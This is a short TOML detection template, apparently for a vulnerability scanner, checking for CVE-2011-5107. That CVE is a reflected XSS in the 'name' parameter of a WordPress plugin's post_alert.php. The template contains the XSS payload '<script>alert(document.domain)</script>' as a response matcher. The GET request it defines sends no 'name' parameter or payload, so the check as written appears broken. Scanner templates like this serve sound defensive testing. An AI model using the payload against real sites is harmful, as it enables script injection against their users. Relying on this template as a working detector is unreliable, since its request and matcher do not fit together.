[info]
author = "ave"
description = "检测 WordPress Alert Before Your Post 插件 0.1.1 及更早版本中 post_alert.php 的 name 参数反射型 XSS 漏洞"
id = "POC-AVE-2011-0019"
name = "CVE-2011-5107 PoC"
severity = "medium"
tags = ["ave-2011-0019"]
vuln_id = [
    "CVE-2011-5107",
    "AVE-2011-0019",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/wp-content/plugins/alert-before-your-post/trunk/post_alert.php"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(document.domain)</script>"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
